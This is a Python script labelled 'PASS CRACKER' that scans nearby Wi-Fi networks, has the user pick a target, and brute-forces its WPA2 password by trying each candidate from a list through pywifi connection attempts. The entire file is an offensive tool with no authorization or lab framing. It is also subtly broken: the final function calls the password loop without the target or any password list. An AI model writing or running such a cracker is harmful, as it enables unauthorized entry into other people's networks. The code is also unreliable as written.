import pywifi
from pywifi import const
import time

def scan_available_networks():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # Select the first Wi-Fi card
    
    iface.scan()  # Trigger the scan
    print("Scanning for networks...")
    time.sleep(2) # Wait for results to populate
    
    scan_results = iface.scan_results()
    networks = {network.ssid for network in scan_results if network.ssid}
    return list(networks)

def wifi_test_loop(target_ssid, password_list):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0] # Select your Wi-Fi card

    for password in password_list:
        password = password.strip()
        print(f"Testing: {password}")

        # 1. Clean up old profiles and disconnect
        iface.disconnect()
        while iface.status() == const.IFACE_CONNECTED:
            time.sleep(0.1)
        iface.remove_all_network_profiles()

        # 2. Create a new profile for this password attempt
        profile = pywifi.Profile()
        profile.ssid = target_ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK) # for most routers
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        # 3. Apply profile and attempt connection
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)

        # 4. Verification Wait (Crucial step)
        start_time = time.time()
        while time.time() - start_time < 2.5: # 2-3 seconds is the standard wait time
            if iface.status() == const.IFACE_CONNECTED:
                print(f"\n[!] SUCCESS! Password is: {password}")
                return password
            time.sleep(0.1)

    print("\n[-] All passwords tested. No match found.")
    return None

def interactive_cracker():
    # 1. Detect and display networks
    networks = scan_available_networks()
    for i, ssid in enumerate(networks):
        print(f"[{i}] {ssid}")
    
    # 2. User selects the target
    choice = int(input("Select the Network ID to test: "))
    target_ssid = networks[choice]
    
    # 3. Start the test (using your brute-force logic)
    print(f"Starting test on: {target_ssid}")

    # 4. The password-testing loop 
    wifi_test_loop()


#Run and execute 
print("PASS CRACKER")
time.sleep(3)
interactive_cracker()
